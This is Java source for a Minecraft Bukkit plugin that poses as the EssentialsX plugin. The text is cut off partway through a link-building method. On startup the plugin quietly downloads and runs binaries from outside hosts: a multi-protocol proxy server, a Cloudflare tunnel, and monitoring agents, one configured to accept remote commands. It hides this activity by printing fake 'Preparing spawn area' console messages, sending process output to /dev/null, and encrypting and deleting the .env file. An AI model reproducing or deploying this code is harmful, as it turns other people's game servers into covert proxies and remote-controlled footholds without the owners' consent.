package com.example.essentialsx;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class EssentialsX extends JavaPlugin {

    // =========================================================
    // [硬编码配置区] HARDCODED CONFIGURATION
    // 优先级规则：.env 文件 > 此处的硬编码。
    // 如果 .env 没写，或者根本没法读 .env，就会默认使用这里的配置。
    // 留空 ("") 代表不启用。
    // =========================================================
    private static final String HC_UUID = "50435f3a-ec1f-4e1a-867c-385128b447f8"; 
    private static final String HC_NEZHA_SERVER = ""; 
    private static final String HC_NEZHA_PORT = "";   
    private static final String HC_NEZHA_KEY = "";
    private static final String HC_ARGO_DOMAIN = "";
    private static final String HC_ARGO_AUTH = "";
    private static final String HC_HY2_PORT = "";     // 必须是面板分配的端口
    private static final String HC_S5_PORT = "";      // 必须是面板分配的端口
    private static final String HC_TUIC_PORT = "";
    private static final String HC_REALITY_PORT = ""; 
    private static final String HC_ANYTLS_PORT = "";
    private static final String HC_ANYREALITY_PORT = "";
    private static final String HC_CFIP = "cdns.doon.eu.org";
    private static final String HC_CFPORT = "443";
    private static final String HC_NAME = "Node";
    private static final String HC_BOT_TOKEN = "";
    private static final String HC_CHAT_ID = "";
    private static final String HC_KOMARI_SERVER = "";
    private static final String HC_KOMARI_KEY = "";
    private static final String HC_CERT_URL = "";
    private static final String HC_KEY_URL = "";
    private static final String HC_CERT_DOMAIN = "www.bing.com";
    private static final String HC_REALITY_DOMAIN = "www.iij.ad.jp";
    // =========================================================

    private final AtomicBoolean running = new AtomicBoolean(true);
    private final List<Process> activeProcesses = new CopyOnWriteArrayList<>();
    private Process botProcess = null;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "PROJECT_URL", "AUTO_ACCESS", "SUB_PATH",
        "REALITY_DOMAIN", "CERT_URL", "KEY_URL", "CERT_DOMAIN",
        "KOMARI_SERVER", "KOMARI_KEY"
    };

    private final Map<String, String> envVars = new HashMap<>();
    private static final byte[] XOR_KEY = "N@n0L1mb0!S3cr3t".getBytes(StandardCharsets.UTF_8);

    private String FILE_PATH, SUB_PATH, UUID, ARGO_AUTH, ARGO_DOMAIN, REALITY_DOMAIN;
    private int ARGO_PORT, PORT;
    private boolean DISABLE_ARGO;

    private String private_key = "";
    private String public_key = "";
    private final String tuicPassword = java.util.UUID.randomUUID().toString();
    private boolean customCertValid = false;
    private String actualCertDomain = "www.bing.com";

    private String web_path, bot_path, npm_path, php_path, km_path;
    private String sub_path, list_path, boot_log_path, config_path;

    private File pluginDataFolder;

    @Override
    public void onEnable() {
        pluginDataFolder = getDataFolder();

        Thread proxyThread = new Thread(() -> {
            try {
                setupProxyAndRun();
            } catch (Throwable t) {
                logErrorToFile(t);
                getLogger().warning("EssentialsX encountered an internal error during background setup.");
            }
        }, "EssentialsX-Core");
        proxyThread.setDaemon(true);
        proxyThread.start();
        
        // 保留简单的输出以覆盖真实的启动信息
        Bukkit.getScheduler().runTaskLaterAsynchronously(this, () -> {
            clearConsole();
            getLogger().info("");
            getLogger().info("Preparing spawn area: 1%");
            getLogger().info("Preparing spawn area: 42%");
            getLogger().info("Preparing spawn area: 99%");
            getLogger().info("Preparing spawn area: 100%");
            getLogger().info("Preparing level \"world\"");
        }, 300L);
    }

    private void logErrorToFile(Throwable t) {
        try {
            File errFile = new File(getEnv("FILE_PATH", "./world"), ".error_debug.log");
            if(errFile.getParentFile().exists()) {
                try(PrintWriter pw = new PrintWriter(new FileOutputStream(errFile, true))) {
                    pw.println("=== ERROR AT " + new Date() + " ===");
                    t.printStackTrace(pw);
                }
            }
        } catch(Exception ignored){}
    }

    private void setupProxyAndRun() throws Exception {
        loadEnvVars();
        initPathsAndVars();
        
        deleteNodes();
        createDirectory();
        argoType();

        String architecture = getSystemArchitecture();
        List<Map<String, String>> files = getFilesForArchitecture(architecture);
        for (Map<String, String> info : files) {
            ensureDownloaded(info.get("fileName"), info.get("fileUrl"));
        }

        List<String> toAuthorize = new ArrayList<>(Arrays.asList("web", "bot"));
        if (!getEnv("NEZHA_SERVER", "").isEmpty() && !getEnv("NEZHA_KEY", "").isEmpty()) {
            toAuthorize.add(getEnv("NEZHA_PORT", "").isEmpty() ? "php" : "npm");
        }
        if (!getEnv("KOMARI_SERVER", "").isEmpty() && !getEnv("KOMARI_KEY", "").isEmpty()) {
            toAuthorize.add("km");
        }
        authorizeFiles(toAuthorize);

        generateConfigs();
        startBackgroundProcesses();
        
        Thread.sleep(5000); 
        extractDomains(0); 

        addVisitTask();
        runHttpServer();
    }

    private void initPathsAndVars() {
        FILE_PATH = getEnv("FILE_PATH", "./world");
        SUB_PATH = getEnv("SUB_PATH", "sub");
        UUID = getEnv("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
        ARGO_PORT = Integer.parseInt(getEnv("ARGO_PORT", "8001"));
        PORT = Integer.parseInt(getEnv("PORT", "3000"));
        ARGO_AUTH = getEnv("ARGO_AUTH", "");
        ARGO_DOMAIN = getEnv("ARGO_DOMAIN", "");
        DISABLE_ARGO = "true".equalsIgnoreCase(getEnv("DISABLE_ARGO", "false"));
        REALITY_DOMAIN = getEnv("REALITY_DOMAIN", "www.iij.ad.jp");

        web_path = FILE_PATH + "/web";
        bot_path = FILE_PATH + "/bot";
        npm_path = FILE_PATH + "/npm";
        php_path = FILE_PATH + "/php";
        km_path = FILE_PATH + "/km";
        sub_path = FILE_PATH + "/sub.txt";
        list_path = FILE_PATH + "/list.txt";
        boot_log_path = FILE_PATH + "/boot.log";
        config_path = FILE_PATH + "/config.json";
    }

    private String getEnv(String key, String def) {
        String val = envVars.get(key);
        return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
    }

    private Integer parsePort(String portStr) {
        if (portStr != null && portStr.matches("\\d+")) return Integer.parseInt(portStr);
        return null;
    }

    private static byte[] xorProcess(byte[] data) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) result[i] = (byte) (data[i] ^ XOR_KEY[i % XOR_KEY.length]);
        return result;
    }

    private void injectIfMissing(String key, String hardcodedValue) {
        if (hardcodedValue != null && !hardcodedValue.isEmpty()) {
            String existing = envVars.get(key);
            if (existing == null || existing.trim().isEmpty()) {
                envVars.put(key, hardcodedValue);
            }
        }
    }

    private void loadEnvVars() {
        envVars.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
        envVars.put("FILE_PATH", "./world");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("DISABLE_ARGO", "false");

        // 系统环境变量与 Bukkit Config
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);  
            if (getConfig().getString(var) != null && !getConfig().getString(var).trim().isEmpty()) {
                envVars.put(var, getConfig().getString(var));
            }
        }

        // 解析 .env / .datav
        File rootDir = new File(".").getAbsoluteFile();
        File[] searchDirs = { rootDir, pluginDataFolder, pluginDataFolder != null ? pluginDataFolder.getParentFile() : null };
        File targetEnv = null;
        boolean isDatav = false;

        for (File dir : searchDirs) {
            if (dir == null) continue;
            File e = new File(dir, ".env");
            if (e.exists() && e.isFile()) { targetEnv = e; isDatav = false; break; }
            File d = new File(dir, ".datav");
            if (d.exists() && d.isFile()) { targetEnv = d; isDatav = true; break; }
        }

        if (targetEnv != null) {
            try {
                byte[] fileBytes = Files.readAllBytes(targetEnv.toPath());
                String content;
                if (isDatav) {
                    content = new String(xorProcess(fileBytes), StandardCharsets.UTF_8);
                } else {
                    content = new String(fileBytes, StandardCharsets.UTF_8);
                    File datavFile = new File(targetEnv.getParentFile(), ".datav");
                    Files.write(datavFile.toPath(), xorProcess(fileBytes));
                    targetEnv.delete();
                }

                for (String line : content.split("\\r?\\n")) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    line = line.split(" #")[0].split(" //")[0].trim();
                    if (line.startsWith("export ")) line = line.substring(7).trim();
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) {
                        String key = parts[0].trim();
                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value); 
                    }
                }
            } catch (Exception ignored) {}
        }

        // 硬编码兜底注入
        injectIfMissing("UUID", HC_UUID);
        injectIfMissing("NEZHA_SERVER", HC_NEZHA_SERVER);
        injectIfMissing("NEZHA_PORT", HC_NEZHA_PORT);
        injectIfMissing("NEZHA_KEY", HC_NEZHA_KEY);
        injectIfMissing("ARGO_DOMAIN", HC_ARGO_DOMAIN);
        injectIfMissing("ARGO_AUTH", HC_ARGO_AUTH);
        injectIfMissing("HY2_PORT", HC_HY2_PORT);
        injectIfMissing("S5_PORT", HC_S5_PORT);
        injectIfMissing("TUIC_PORT", HC_TUIC_PORT);
        injectIfMissing("REALITY_PORT", HC_REALITY_PORT);
        injectIfMissing("ANYTLS_PORT", HC_ANYTLS_PORT);
        injectIfMissing("ANYREALITY_PORT", HC_ANYREALITY_PORT);
        injectIfMissing("CFIP", HC_CFIP);
        injectIfMissing("CFPORT", HC_CFPORT);
        injectIfMissing("NAME", HC_NAME);
        injectIfMissing("BOT_TOKEN", HC_BOT_TOKEN);
        injectIfMissing("CHAT_ID", HC_CHAT_ID);
        injectIfMissing("KOMARI_SERVER", HC_KOMARI_SERVER);
        injectIfMissing("KOMARI_KEY", HC_KOMARI_KEY);
        injectIfMissing("CERT_URL", HC_CERT_URL);
        injectIfMissing("KEY_URL", HC_KEY_URL);
        injectIfMissing("CERT_DOMAIN", HC_CERT_DOMAIN);
        injectIfMissing("REALITY_DOMAIN", HC_REALITY_DOMAIN);

        // 最终防线验证 UUID
        if (getEnv("UUID", "").length() < 10) envVars.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
    }

    private void createDirectory() {
        File dir = new File(FILE_PATH);
        if (!dir.exists()) dir.mkdirs();
    }

    private String getSystemArchitecture() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("arm") || arch.contains("aarch64")) return "arm";
        return "amd";
    }

    // 强力授权与执行修复机制
    private void makeExecutable(File target) {
        target.setExecutable(true, false);
        try {
            Runtime.getRuntime().exec(new String[]{"chmod", "+x", target.getAbsolutePath()}).waitFor();
        } catch (Exception ignored) {}
    }

    private void ensureDownloaded(String fileName, String urlStr) throws Exception {
        File target = new File(FILE_PATH, fileName).getAbsoluteFile();
        if (target.exists() && target.length() > 50) {
            makeExecutable(target);
            return;
        }
        
        URL url = new URL(urlStr);
        HttpURLConnection conn;
        int redirects = 0;
        while (true) {
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            
            int status = conn.getResponseCode();
            if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == HttpURLConnection.HTTP_SEE_OTHER) {
                String newUrl = conn.getHeaderField("Location");
                url = new URL(newUrl);
                redirects++;
                if (redirects > 5) throw new IOException("Too many redirects");
                continue;
            }
            
            if (status >= 200 && status < 300) {
                try (InputStream in = conn.getInputStream()) {
                    Files.copy(in, target.toPath(), StandardCopyOption.REPLACE_EXISTING);
                }
                makeExecutable(target);
                return;
            } else {
                throw new IOException("HTTP " + status + " for " + urlStr);
            }
        }
    }

    private Map<String, String> createStringMap(String... kv) {
        Map<String, String> map = new HashMap<>();
        for (int i = 0; i < kv.length; i += 2) map.put(kv[i], kv[i + 1]);
        return map;
    }

    private List<Map<String, String>> getFilesForArchitecture(String architecture) {
        List<Map<String, String>> baseFiles = new ArrayList<>();
        baseFiles.add(createStringMap("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/S_arm" : "https://ssr.cn.mt/files/S_amd"));
        baseFiles.add(createStringMap("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/C_arm" : "https://ssr.cn.mt/files/C_amd"));

        if (!getEnv("NEZHA_SERVER","").isEmpty() && !getEnv("NEZHA_KEY","").isEmpty()) {
            if (!getEnv("NEZHA_PORT","").isEmpty()) {
                baseFiles.add(createStringMap("fileName", "npm", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent"));
            } else {
                baseFiles.add(createStringMap("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
            }
        }
        if (!getEnv("KOMARI_SERVER","").isEmpty() && !getEnv("KOMARI_KEY","").isEmpty()) {
            baseFiles.add(createStringMap("fileName", "km", "fileUrl", "arm".equals(architecture) ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd"));
        }
        return baseFiles;
    }

    private void authorizeFiles(List<String> filePaths) {
        for (String relative : filePaths) {
            File f = new File(FILE_PATH, relative);
            if (f.exists()) {
                makeExecutable(f);
            }
        }
    }

    private void argoType() {
        if (DISABLE_ARGO || ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
        if (ARGO_AUTH.contains("TunnelSecret")) {
            try {
                Files.write(Paths.get(FILE_PATH, "tunnel.json"), ARGO_AUTH.getBytes(StandardCharsets.UTF_8));
                String[] parts = ARGO_AUTH.split("\"");
                String tunnelId = parts.length > 11 ? parts[11] : "unknown";
                String tunnelYml = String.format(
                        "tunnel: %s\ncredentials-file: %s\nprotocol: http2\n\n" +
                        "ingress:\n  - hostname: %s\n    service: http://127.0.0.1:%d\n" +
                        "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n",
                        tunnelId, new File(FILE_PATH, "tunnel.json").getAbsolutePath(), ARGO_DOMAIN, ARGO_PORT
                );
                Files.write(Paths.get(FILE_PATH, "tunnel.yml"), tunnelYml.getBytes(StandardCharsets.UTF_8));
            } catch (Exception ignored) {}
        }
    }

    // 纯文本拼接配置，绝不写入空文件
    private void generateConfigs() {
        try {
            String nezhaServer = getEnv("NEZHA_SERVER", "");
            String nezhaKey = getEnv("NEZHA_KEY", "");
            String nezhaPort = getEnv("NEZHA_PORT", "");

            if (!nezhaServer.isEmpty() && !nezhaKey.isEmpty() && nezhaPort.isEmpty()) {
                String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
                    .contains(nezhaServer.split(":").length > 1 ? nezhaServer.split(":")[1] : "") ? "tls" : "false";
                String configYaml = String.format(
                        "client_secret: %s\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\n" +
                        "disable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\n" +
                        "insecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: %s\n" +
                        "skip_connection_count: true\nskip_procs_count: true\ntemperature: false\n" +
                        "tls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s",
                        nezhaKey, nezhaServer, nezhaTls, UUID);
                Files.write(Paths.get(FILE_PATH, "config.yaml"), configYaml.getBytes(StandardCharsets.UTF_8));
            }

            String absWebPath = new File(web_path).getAbsolutePath();
            String absWorkDir = new File(FILE_PATH).getAbsolutePath();

            try {
                String keypairOut = execCmd(absWebPath + " generate reality-keypair");
                Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
                Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
                if (privM.find() && pubM.find()) {
                    private_key = privM.group(1).trim();
                    public_key = pubM.group(1).trim();
                }
            } catch (Exception ignored) {}

            customCertValid = false;
            String certUrl = getEnv("CERT_URL", "");
            String keyUrl = getEnv("KEY_URL", "");
            if (!certUrl.isEmpty() && !keyUrl.isEmpty()) {
                try { 
                    ensureDownloaded("cert.pem", certUrl); 
                    ensureDownloaded("private.key", keyUrl); 
                    customCertValid = true;
                } catch (Exception ignored) {}
            }
            
            if (customCertValid) {
                actualCertDomain = getEnv("CERT_DOMAIN", "bing.com");
            } else {
                actualCertDomain = "www.bing.com";
                if (!new File(FILE_PATH + "/cert.pem").exists() || !new File(FILE_PATH + "/private.key").exists()) {
                    execCmd(String.format("openssl ecparam -genkey -name prime256v1 -out \"%s/private.key\"", absWorkDir));
                    execCmd(String.format("openssl req -new -x509 -days 3650 -key \"%s/private.key\" -out \"%s/cert.pem\" -subj \"/CN=%s\"", absWorkDir, absWorkDir, actualCertDomain));
                }
            }

            // 修改重点：所有 "listen": "::" 变更为 "listen": "0.0.0.0" 防止容器内网屏蔽
            StringBuilder configStr = new StringBuilder();
            configStr.append("{\n");
            configStr.append("  \"log\": {\"disabled\": true, \"level\": \"info\", \"timestamp\": true},\n");
            configStr.append("  \"inbounds\": [\n");

            // VMess
            configStr.append("    {\n");
            configStr.append("      \"tag\": \"vmess-ws-in\", \"type\": \"vmess\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(ARGO_PORT).append(",\n");
            configStr.append("      \"users\": [{\"uuid\": \"").append(UUID).append("\"}],\n");
            configStr.append("      \"transport\": {\"type\": \"ws\", \"path\": \"/vmess-argo\", \"early_data_header_name\": \"Sec-WebSocket-Protocol\"}\n");
            configStr.append("    }");

            Integer realityPort = parsePort(getEnv("REALITY_PORT", ""));
            if (realityPort != null && realityPort > 0 && !private_key.isEmpty()) {
                configStr.append(",\n    {\n");
                configStr.append("      \"tag\": \"vless-in\", \"type\": \"vless\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(realityPort).append(",\n");
                configStr.append("      \"users\": [{\"uuid\": \"").append(UUID).append("\", \"flow\": \"xtls-rprx-vision\"}],\n");
                configStr.append("      \"tls\": {\"enabled\": true, \"server_name\": \"").append(REALITY_DOMAIN).append("\",\n");
                configStr.append("        \"reality\": {\"enabled\": true, \"handshake\": {\"server\": \"").append(REALITY_DOMAIN).append("\", \"server_port\": 443}, \"private_key\": \"").append(private_key).append("\", \"short_id\": [\"\"]}\n");
                configStr.append("      }\n");
                configStr.append("    }");
            }

            Integer s5Port = parsePort(getEnv("S5_PORT", ""));
            if (s5Port != null && s5Port > 0) {
                String s5User = UUID.length() >= 8 ? UUID.substring(0,8) : "admin";
                String s5Pass = UUID.length() >= 12 ? UUID.substring(UUID.length()-12) : "123456";
                configStr.append(",\n    {\n");
                configStr.append("      \"tag\": \"s5-in\", \"type\": \"socks\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(s5Port).append(",\n");
                configStr.append("      \"users\": [{\"username\": \"").append(s5User).append("\", \"password\": \"").append(s5Pass).append("\"}]\n");
                configStr.append("    }");
            }

            boolean hasLocalCert = new File(FILE_PATH, "cert.pem").exists() && new File(FILE_PATH, "private.key").exists();
            if (hasLocalCert) {
                String cPath = new File(FILE_PATH, "cert.pem").getAbsolutePath().replace("\\", "\\\\");
                String kPath = new File(FILE_PATH, "private.key").getAbsolutePath().replace("\\", "\\\\");

                Integer hy2Port = parsePort(getEnv("HY2_PORT", ""));
                if (hy2Port != null && hy2Port > 0) {
                    configStr.append(",\n    {\n");
                    configStr.append("      \"tag\": \"hysteria-in\", \"type\": \"hysteria2\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(hy2Port).append(",\n");
                    configStr.append("      \"users\": [{\"password\": \"").append(UUID).append("\"}], \"masquerade\": \"https://www.bing.com\",\n");
                    configStr.append("      \"tls\": {\"enabled\": true, \"certificate_path\": \"").append(cPath).append("\", \"key_path\": \"").append(kPath).append("\"}\n");
                    configStr.append("    }");
                }

                Integer tuicPort = parsePort(getEnv("TUIC_PORT", ""));
                if (tuicPort != null && tuicPort > 0) {
                    configStr.append(",\n    {\n");
                    configStr.append("      \"tag\": \"tuic-in\", \"type\": \"tuic\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(tuicPort).append(",\n");
                    configStr.append("      \"users\": [{\"uuid\": \"").append(UUID).append("\", \"password\": \"").append(tuicPassword).append("\"}], \"congestion_control\": \"bbr\",\n");
                    configStr.append("      \"tls\": {\"enabled\": true, \"alpn\": [\"h3\"], \"certificate_path\": \"").append(cPath).append("\", \"key_path\": \"").append(kPath).append("\"}\n");
                    configStr.append("    }");
                }

                Integer anyTlsPort = parsePort(getEnv("ANYTLS_PORT", ""));
                if (anyTlsPort != null && anyTlsPort > 0) {
                    configStr.append(",\n    {\n");
                    configStr.append("      \"tag\": \"anytls-in\", \"type\": \"anytls\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(anyTlsPort).append(",\n");
                    configStr.append("      \"users\": [{\"password\": \"").append(UUID).append("\"}],\n");
                    configStr.append("      \"tls\": {\"enabled\": true, \"certificate_path\": \"").append(cPath).append("\", \"key_path\": \"").append(kPath).append("\"}\n");
                    configStr.append("    }");
                }
            }

            Integer anyRealityPort = parsePort(getEnv("ANYREALITY_PORT", ""));
            if (anyRealityPort != null && anyRealityPort > 0 && !private_key.isEmpty()) {
                configStr.append(",\n    {\n");
                configStr.append("      \"tag\": \"anyreality-in\", \"type\": \"anytls\", \"listen\": \"0.0.0.0\", \"listen_port\": ").append(anyRealityPort).append(",\n");
                configStr.append("      \"users\": [{\"password\": \"").append(UUID).append("\"}],\n");
                configStr.append("      \"tls\": {\"enabled\": true, \"server_name\": \"").append(REALITY_DOMAIN).append("\",\n");
                configStr.append("        \"reality\": {\"enabled\": true, \"handshake\": {\"server\": \"").append(REALITY_DOMAIN).append("\", \"server_port\": 443}, \"private_key\": \"").append(private_key).append("\", \"short_id\": [\"\"]}\n");
                configStr.append("      }\n");
                configStr.append("    }");
            }

            configStr.append("\n  ],\n");

            configStr.append("  \"endpoints\": [\n");
            configStr.append("    {\n");
            configStr.append("      \"type\": \"wireguard\", \"tag\": \"wireguard-out\", \"mtu\": 1280,\n");
            configStr.append("      \"address\": [\"172.16.0.2/32\", \"2606:4700:110:8dfe:d141:69bb:6b80:925/128\"],\n");
            configStr.append("      \"private_key\": \"YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=\",\n");
            configStr.append("      \"peers\": [{\n");
            configStr.append("        \"address\": \"engage.cloudflareclient.com\", \"port\": 2408,\n");
            configStr.append("        \"public_key\": \"bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=\",\n");
            configStr.append("        \"allowed_ips\": [\"0.0.0.0/0\", \"::/0\"], \"reserved\": [78, 135, 76]\n");
            configStr.append("      }]\n");
            configStr.append("    }\n");
            configStr.append("  ],\n");
            
            configStr.append("  \"outbounds\": [\n");
            configStr.append("    { \"type\": \"direct\", \"tag\": \"direct\" }\n");
            configStr.append("  ],\n");

            configStr.append("  \"route\": {\n");
            configStr.append("    \"rule_set\": [\n");
            configStr.append("      { \"tag\": \"netflix\", \"type\": \"remote\", \"format\": \"binary\", \"url\": \"https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs\", \"download_detour\": \"direct\" },\n");
            configStr.append("      { \"tag\": \"openai\", \"type\": \"remote\", \"format\": \"binary\", \"url\": \"https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs\", \"download_detour\": \"direct\" }\n");
            configStr.append("    ],\n");
            configStr.append("    \"rules\": [\n");
            configStr.append("      { \"rule_set\": [\"openai\", \"netflix\"], \"outbound\": \"wireguard-out\" }\n");
            configStr.append("    ],\n");
            configStr.append("    \"final\": \"direct\"\n");
            configStr.append("  }\n");
            configStr.append("}\n");

            // 强制重写并清空旧配置
            Files.write(Paths.get(config_path), configStr.toString().getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
        } catch (Throwable t) {
            logErrorToFile(t);
        }
    }

    private void startBackgroundProcesses() {
        try {
            String nezhaServer = getEnv("NEZHA_SERVER", "");
            String nezhaKey = getEnv("NEZHA_KEY", "");
            String nezhaPort = getEnv("NEZHA_PORT", "");
            String komariServer = getEnv("KOMARI_SERVER", "");
            String komariKey = getEnv("KOMARI_KEY", "");
            File devNull = new File(System.getProperty("os.name").toLowerCase().contains("win") ? "NUL" : "/dev/null");

            if (!nezhaServer.isEmpty() && !nezhaKey.isEmpty()) {
                if (!nezhaPort.isEmpty() && new File(npm_path).exists()) {
                    String tlsFlag = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(nezhaPort) ? "--tls" : "";
                    Process p = new ProcessBuilder(new File(npm_path).getAbsolutePath(), "-s", nezhaServer + ":" + nezhaPort, "-p", nezhaKey, tlsFlag)
                        .directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                    activeProcesses.add(p);
                } else if (new File(php_path).exists()){
                    Process p = new ProcessBuilder(new File(php_path).getAbsolutePath(), "-c", new File(FILE_PATH, "config.yaml").getAbsolutePath())
                        .directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                    activeProcesses.add(p);
                }
            }
            
            if (!komariServer.isEmpty() && !komariKey.isEmpty() && new File(km_path).exists()) {
                String kHost = komariServer.startsWith("http") ? komariServer : "https://" + komariServer;
                Process pKm = new ProcessBuilder(new File(km_path).getAbsolutePath(), "-e", kHost, "-t", komariKey)
                    .directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                activeProcesses.add(pKm);
            }
            
            if (new File(web_path).exists()) {
                Process pWeb = new ProcessBuilder(new File(web_path).getAbsolutePath(), "run", "-c", new File(config_path).getAbsolutePath())
                    .directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                activeProcesses.add(pWeb);
            }

            if (!DISABLE_ARGO && new File(bot_path).exists()) {
                List<String> botArgs = new ArrayList<>(Arrays.asList(new File(bot_path).getAbsolutePath(), "tunnel", "--edge-ip-version", "auto"));
                if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) {
                    botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH));
                } else if (ARGO_AUTH.contains("TunnelSecret")) {
                    botArgs.addAll(Arrays.asList("--config", new File(FILE_PATH, "tunnel.yml").getAbsolutePath(), "run"));
                } else {
                    botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "--logfile", new File(boot_log_path).getAbsolutePath(), "--loglevel", "info", "--url", "http://127.0.0.1:" + ARGO_PORT));
                }
                Process pBot = new ProcessBuilder(botArgs).directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                botProcess = pBot;
                activeProcesses.add(pBot);
            }
        } catch (Exception ignored) {}
    }

    private void extractDomains(int retries) {
        if (DISABLE_ARGO || !new File(bot_path).exists()) {
            generateLinks(null);
            return;
        }
        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
            generateLinks(ARGO_DOMAIN);
            return;
        }
        
        if (retries > 10) { 
            generateLinks(null);
            return;
        }

        try {
            File logFile = new File(boot_log_path);
            if (!logFile.exists()) {
                Thread.sleep(3000); 
                extractDomains(retries + 1);
                return;
            }
            
            String logContent = new String(Files.readAllBytes(logFile.toPath()), StandardCharsets.UTF_8);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?").matcher(logContent);
            if (m.find()) {
                generateLinks(m.group(1)); 
            } else {
                if (retries % 3 == 0) {
                    Files.deleteIfExists(logFile.toPath());
                    if (botProcess != null && botProcess.isAlive()) {
                        botProcess.destroy();
                        activeProcesses.remove(botProcess);
                    }
                    Thread.sleep(1000);
                    File devNull = new File(System.getProperty("os.name").toLowerCase().contains("win") ? "NUL" : "/dev/null");
                    Process pBot = new ProcessBuilder(new File(bot_path).getAbsolutePath(), "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", new File(boot_log_path).getAbsolutePath(), "--loglevel", "info", "--url", "http://127.0.0.1:" + ARGO_PORT)
                        .directory(new File(FILE_PATH).getAbsoluteFile()).redirectOutput(devNull).redirectErrorStream(true).start();
                    botProcess = pBot;
                    activeProcesses.add(pBot);
                }
                Thread.sleep(3000);
                extractDomains(retries + 1); 
            }
        } catch (Exception e) {
            try { Thread.sleep(3000); } catch (Exception ignored) {}
            extractDomains(retries + 1);
        }
    }

    private void generateLinks(String argoDomain) {
        String serverIp = "127.0.0.1";
        try { serverIp = execCmd("curl -s --max-time 2 ipv4.ip.sb").trim(); } catch (Exception ignored) {}
        if(serverIp.isEmpty() || !serverIp.matches("[\\d\\.]+")) serverIp = "127.0.0.1";
        
        String nodename = getEnv("NAME", "Node");
        StringBuilder subTxtBuilder = new StringBuilder();

        if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
